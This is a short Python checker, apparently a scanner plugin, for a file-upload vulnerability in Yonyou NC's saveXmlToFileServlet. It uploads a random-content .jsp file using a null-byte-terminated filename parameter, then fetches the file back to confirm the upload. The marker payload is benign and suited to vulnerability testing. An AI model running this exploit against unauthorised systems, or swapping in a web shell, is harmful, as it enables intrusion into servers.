import requests
import urllib

from inc.generate_random import generate_random_str
def verify(url):
    relsult = {
        'name': '用友NC接口saveXmlToFIleServlet存在文件上传',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Content-Type': 'application/octet-stream',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    }
    char= generate_random_str(5)
    char_data = generate_random_str(15)
    data = f'''{char_data}'''
    vurl = urllib.parse.urljoin(url, f"/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename={char}.jsp%00")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = url + f'/portal/processxml/{char}.jsp'
            response = requests.get(vurl)
            if response.status_code == 200 and char_data in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult